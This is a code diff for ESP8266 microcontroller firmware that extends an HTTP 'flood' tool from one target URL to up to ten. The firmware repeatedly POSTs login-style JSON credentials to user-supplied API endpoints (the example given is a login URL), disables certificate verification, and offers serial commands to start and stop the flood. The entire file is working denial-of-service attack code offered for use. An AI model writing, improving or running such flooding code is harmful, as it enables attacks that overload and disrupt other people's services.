@@ -1,73 +1,107 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266HTTPClient.h>
 
-const char* ssid = "WiFi-NAME";  
-const char* password = "WiFi-PASSWORD";  
+const char* ssid = "WiFi-NAME";
+const char* password = "WiFi-PASSWORD";
 
-String target_url = "";  
-bool floodActive = false;  
+const int MAX_APIS = 10;
+String target_urls[MAX_APIS];
+int apiCount = 0;
+bool floodActive = false;
 int requestCount = 0;
-unsigned long startMillis;
+unsigned long startMillis = 0;
 unsigned long cooldownMillis = 0;
 
 void connectWiFi() {
   WiFi.mode(WIFI_STA);
   WiFi.begin(ssid, password);
-  Serial.print("Connecting to WiFi...");
-  
+  Serial.print("Connecting to WiFi");
   int timeout = 20;
   while (WiFi.status() != WL_CONNECTED && timeout > 0) {
     delay(500);
     Serial.print(".");
     timeout--;
   }
-
   if (WiFi.status() == WL_CONNECTED) {
-    Serial.println("\nConnected!");
-    Serial.print("Device IP: ");
+    Serial.println("\nWiFi connected.");
+    Serial.print("IP: ");
     Serial.println(WiFi.localIP());
-    Serial.println("Enter target URL (Example: https://site.com/api/login)");
+    Serial.println("Commands: url <URL>, clear, start, stop");
   } else {
     Serial.println("\nWiFi connection failed.");
   }
 }
 
-void sendFloodRequest() {
+void sendFloodRequest(const String &url) {
   if (WiFi.status() != WL_CONNECTED) {
-    Serial.println("WiFi Disconnected!");
+    Serial.println("WiFi Disconnected");
     return;
   }
-
-  if (target_url == "") {
-    Serial.println("Target URL not set!");
-    return;
-  }
-
   WiFiClientSecure client;
   HTTPClient http;
-  client.setInsecure();  
-  http.begin(client, target_url);
+  client.setInsecure();
+  http.begin(client, url);
   http.addHeader("Content-Type", "application/json");
-
-  String username = "test2";
-  String password = "test1";
-  String payload = "{\"username\": \"" + username + "\", \"password\": \"" + password + "\"}";
-
+  String payload = "{\"username\":\"test2\",\"password\":\"test1\"}";
   int httpResponseCode = http.POST(payload);
-
   if (httpResponseCode > 0) {
     requestCount++;
-    Serial.print("Request Sent: ");
-    Serial.print(username);
-    Serial.print(" / ");
-    Serial.print(password);
-    Serial.print("  Response: ");
+    Serial.print("Req Sent | Response: ");
     Serial.println(httpResponseCode);
   } else {
-    Serial.println("Request Failed.");
+    Serial.println("Request Failed");
   }
-
   http.end();
+}
+
+void processCommand(String command) {
+  command.trim();
+  if (command.startsWith("url ")) {
+    if (apiCount < MAX_APIS) {
+      String url = command.substring(4);
+      target_urls[apiCount] = url;
+      apiCount++;
+      Serial.print("Added URL: ");
+      Serial.println(url);
+    } else {
+      Serial.println("Max API limit reached");
+    }
+  } else if (command.equalsIgnoreCase("clear")) {
+    apiCount = 0;
+    Serial.println("Cleared all URLs");
+  } else if (command.equalsIgnoreCase("start")) {
+    if (apiCount == 0) {
+      Serial.println("No URLs set. Use 'url <URL>' command.");
+    } else {
+      floodActive = true;
+      requestCount = 0;
+      startMillis = millis();
+      cooldownMillis = millis();
+      Serial.println("Flood Started");
+    }
+  } else if (command.equalsIgnoreCase("stop")) {
+    floodActive = false;
+    Serial.println("Flood Stopped");
+  } else {
+    Serial.println("Unknown command");
+  }
+}
+
+void floodRequests() {
+  if (millis() - cooldownMillis >= 10000) {
+    if (requestCount >= 1000) {
+      Serial.println("Overheating. Cooling down 5 seconds.");
+      delay(5000);
+    }
+    requestCount = 0;
+    cooldownMillis = millis();
+  }
+  for (int i = 0; i < apiCount; i++) {
+    for (int j = 0; j < 10; j++) {
+      sendFloodRequest(target_urls[i]);
+      delay(1);
+    }
+  }
 }
 
 void setup() {
@@ -77,42 +111,10 @@ void setup() {
 
 void loop() {
   if (Serial.available()) {
-    String command = Serial.readStringUntil('\n');
-    command.trim();
-
-    if (command.startsWith("url ")) {
-      target_url = command.substring(4);
-      Serial.print("Target URL Set: ");
-      Serial.println(target_url);
-    } else if (command == "start") {
-      if (target_url == "") {
-        Serial.println("Set target URL first: 'url https://example.com/api/login'");
-      } else {
-        floodActive = true;
-        requestCount = 0;
-        startMillis = millis();
-        cooldownMillis = 0;
-        Serial.println("Flood Started.");
-      }
-    } else if (command == "stop") {
-      floodActive = false;
-      Serial.println("Flood Stopped.");
-    }
+    String cmd = Serial.readStringUntil('\n');
+    processCommand(cmd);
   }
-
   if (floodActive) {
-    if (millis() - cooldownMillis >= 10000) {
-      if (requestCount >= 1000) {
-        Serial.println("Device overheating. Cooling down for 5 seconds.");
-        delay(5000);  
-      }
-      requestCount = 0;
-      cooldownMillis = millis();
-    }
-
-    for (int i = 0; i < 10; i++) {
-      sendFloodRequest();
-      delay(1);  
-    }
+    floodRequests();
   }
 }
